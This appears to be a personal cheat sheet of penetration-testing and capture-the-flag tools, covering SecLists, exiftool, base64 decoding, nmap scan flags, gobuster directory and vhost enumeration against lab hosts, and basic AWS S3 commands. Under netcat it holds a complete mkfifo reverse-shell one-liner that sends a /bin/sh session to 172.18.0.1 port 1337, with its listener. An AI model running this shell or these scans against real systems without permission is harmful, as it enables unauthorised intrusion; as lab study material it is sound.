---
Title: Tools
Description:
---



## Project

+ [danielmiessler/SecLists](https://github.com/danielmiessler/SecLists) \
  SecLists is the security tester's companion. It's a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.

## CLI Tools

### exiftool  

```shell
exiftool XXX.jpg
```

### base64  

ex: `echo "XXX" | base64 -d`

### convert ASCII values into ASCII characters  

`echo "XXX" | awk '{ printf("%c" ,$0); }'`

### [Rockstar](https://codewithrockstar.com/online) \

Rockstar is a computer programming language designed for creating programs that are also hair metal power ballads.

### nc

Netcat is a versatile utility for working with TCP or UDP data.

``` shell
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 172.18.0.1 1337 > /tmp/f; rm /tmp/f
nc -nlvp 1337
```

+ [Netcat（Linux nc 指令）網路管理者工具實用範例](https://blog.gtwang.org/linux/linux-utility-netcat-examples/)

### hydra

### nmap

+ faster: `sudo nmap --top-ports 3000  -F -sS -sC -sV -n -T4 ${ip}`

> -F: Fast mode - Scan fewer ports than the default scan
>
> -sS (TCP SYN scan)
> SYN scan is the default and most popular scan option for good reasons. It can be
> performed quickly, scanning thousands of ports per second on a fast network not
> hampered by restrictive firewalls.
>
> -sC: Performs a script scan using the default set of scripts. It is equivalent to --
> script=default. Some of the scripts in this category are considered intrusive and
> should not be run against a target network without permission.
>
> -sV: Enables version detection, which will detect what versions are running on what port.
>
> -n (No DNS resolution)
>
> -T4 prohibits the dynamic scan delay from exceeding 10 ms for TCP ports

### gobuster

directory/file enumeration mode

+ `gobuster dir --url http://10.129.14.195/ --wordlist ../../tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -x php,html`

VHOST enumeration mode

+ `gobuster vhost -w ../../tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb`

### s3

+ `aws configure`
+ `aws s3 ls`
